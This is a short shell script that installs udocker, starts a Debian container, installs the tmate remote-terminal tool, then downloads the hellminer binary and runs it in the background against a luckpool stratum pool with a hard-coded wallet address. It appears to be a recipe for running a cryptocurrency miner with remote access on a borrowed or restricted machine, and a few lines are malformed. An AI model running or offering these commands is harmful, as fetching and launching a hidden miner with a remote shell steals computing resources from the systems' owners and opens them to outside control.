wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz
tar zxvf udocker-1.3.9.tar.gz
export PATH=pwd/udocker-1.3.9/udocker:$PATH

wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9
cd udocker
./udocker pull debian:bullseye
./udocker create --name=debian debian:bullseye
./udocker udocker run debian /bin/bash

sudo apt-get update

sudo apt-get install tmate

wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
tar -xf hellminer_linux64.tar.gz
./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RWCmghxFaWAWiF6tECkToJBs7Ydj8E4r9L.A1 -p x --cpu 4 & > /dev/null
